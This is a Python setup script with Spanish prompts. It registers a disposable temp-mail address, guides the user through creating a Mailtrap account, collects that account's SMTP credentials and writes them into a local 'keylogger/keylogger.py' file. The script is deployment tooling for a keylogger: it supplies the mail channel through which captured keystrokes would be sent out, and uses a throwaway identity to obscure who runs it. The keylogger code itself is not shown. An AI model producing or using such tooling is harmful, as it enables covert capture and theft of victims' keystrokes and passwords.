import requests
import os
from dotenv import load_dotenv
import random
import string
import time
import re
import webbrowser

# Carga las claves necesarias desde .env
load_dotenv()
API_KEY = os.getenv("RAPIDAPI_KEY")
AUTH_TOKEN = os.getenv("TEMPMAIL_TOKEN")

if not API_KEY or not AUTH_TOKEN:
    print("❌ Error: Las variables de entorno RAPIDAPI_KEY y TEMPMAIL_TOKEN deben estar definidas.")
    exit(1)

HEADERS = {
    "X-RapidAPI-Key": API_KEY,
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "X-RapidAPI-Host": "tempmail-so.p.rapidapi.com"
}

def get_domain():
    url = "https://tempmail-so.p.rapidapi.com/domains"
    try:
        res = requests.get(url, headers=HEADERS, timeout=10)
        res.raise_for_status()
        dominios = res.json().get("data")
        if dominios and len(dominios) > 0:
            return dominios[0]["domain"]
        else:
            print("❌ No se encontraron dominios disponibles.")
            exit(1)
    except Exception as e:
        print(f"❌ Error al obtener dominios: {e}")
        exit(1)

def generar_nombre():
    return "user_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

def crear_buzon(nombre, dominio):
    url = "https://tempmail-so.p.rapidapi.com/inboxes"
    try:
        res = requests.post(url, headers=HEADERS, data={
            "name": nombre,
            "domain": dominio,
            "lifespan": 600
        }, timeout=10)
        res.raise_for_status()
        return res.json()["data"]["id"]
    except Exception as e:
        print(f"❌ Error al crear buzón: {e}")
        exit(1)

def leer_bandeja(inbox_id):
    url = f"https://tempmail-so.p.rapidapi.com/inboxes/{inbox_id}/mails"
    try:
        res = requests.get(url, headers=HEADERS, timeout=10)
        res.raise_for_status()
        return res.json().get("data", [])
    except Exception as e:
        print(f"❌ Error al leer bandeja: {e}")
        return []

def leer_mensaje(inbox_id, mail_id):
    url = f"https://tempmail-so.p.rapidapi.com/inboxes/{inbox_id}/mails/{mail_id}"
    try:
        res = requests.get(url, headers=HEADERS, timeout=10)
        res.raise_for_status()
        return res.json().get("data", {})
    except Exception as e:
        print(f"❌ Error al leer mensaje: {e}")
        return {}

def extraer_primer_enlace(texto):
    coincidencias = re.findall(r'https?://[^\s"\<>]+', texto)
    return coincidencias[0] if coincidencias else None

def save_credentials(USERNAME, PASSWORD, MAILTRAP_KEY=".env"):
    try:
        with open(MAILTRAP_KEY, "a", encoding="utf-8") as f:
            f.write(f"USERNAME={USERNAME}\n")
            f.write(f"PASSWORD={PASSWORD}\n")
        print(f"✅ Credenciales guardadas en {MAILTRAP_KEY}")
    except Exception as e:
        print(f"❌ Error al guardar credenciales: {e}")

def modificar_keylogger(nuevo_username, nuevo_password):
    ruta = "keylogger/keylogger.py"
    try:
        with open(ruta, "r", encoding="utf-8") as f:
            contenido = f.read()
        contenido = contenido.replace("YOUR_USERNAME", nuevo_username)
        contenido = contenido.replace("YOUR_PASSWORD", nuevo_password)
        with open(ruta, "w", encoding="utf-8") as f:
            f.write(contenido)
        print("✅ Archivo keylogger.py actualizado con las nuevas credenciales.")
    except Exception as e:
        print(f"❌ Error al modificar keylogger.py: {e}")

def main():
    dominio = get_domain()
    nombre = generar_nombre()
    correo = f"{nombre}@{dominio}"
    print(f"📨 Tu correo temporal es: {correo}")

    register_url = "https://mailtrap.io/register/signup?ref=header"
    print("🌐 Abriendo página de registro...")
    webbrowser.open(register_url)

    inbox_id = crear_buzon(nombre, dominio)

    print("⌛ Esperando mensaje... (hasta 2 minutos)")
    for i in range(24):
        mensajes = leer_bandeja(inbox_id)
        if mensajes:
            print(f"✅ ¡Tienes {len(mensajes)} mensaje(s)!")
            for mensaje in mensajes:
                print("\n📧 Asunto:", mensaje.get("subject"))
                print("🧑‍💻 De:", mensaje.get("from"))

                mail_id = mensaje["id"]
                detalle = leer_mensaje(inbox_id, mail_id)

                texto = detalle.get("textContent") or detalle.get("htmlContent") or "[Sin contenido]"
                print("📝 Vista previa real:\n", texto[:300])
                print("\n🔍 Contenido completo:\n", texto)

                enlace = extraer_primer_enlace(texto)
                if enlace:
                    print(f"\n🔗 Enlace encontrado: {enlace}\n")
                    print("\n🌐 Abriendo enlace de verificación en el navegador...\n")
                    webbrowser.open(enlace)

                    input(f"🛑 Cuando hayas confirmado el correo y hayas iniciado sesión en la página con:\n\nCorreo: {correo}\nContraseña: (contraseña que usaste en la página)\n\nPresiona 'Enter' para continuar... ")
                    input("Ahora termina el registro agregando la información que te pide, y cuando la página te pregunte qué producto usarás, selecciona 'Email API/SMTP', dejando el dominio tal cual está. Presiona 'Enter' cuando hayas terminado... ")
                    input("Ahora en la página de inicio, ve a 'Sandbox' en 'My Project', luego 'My Sandbox' y en la pestaña de integración están las credenciales que necesitas. Presiona 'Enter' para continuar... ")

                    EMAIL_ADDRESS = input("Escribe el USERNAME de las credenciales SMTP: ").strip()
                    PASSWORD_ADDRESS = input("Escribe el PASSWORD de las credenciales SMTP: ").strip()

                    save_credentials(EMAIL_ADDRESS, PASSWORD_ADDRESS)
                    modificar_keylogger(EMAIL_ADDRESS, PASSWORD_ADDRESS)
                    print("\nVerifica que el archivo keylogger.py se haya modificado correctamente.\n")
                else:
                    print("⚠️ No se encontró ningún enlace en el mensaje.")
            break
        else:
            print(f"⏳ Esperando... {(i+1)*5}s")
            time.sleep(5)
    else:
        print("😞 No llegó ningún mensaje.")

if __name__ == "__main__":
    main()
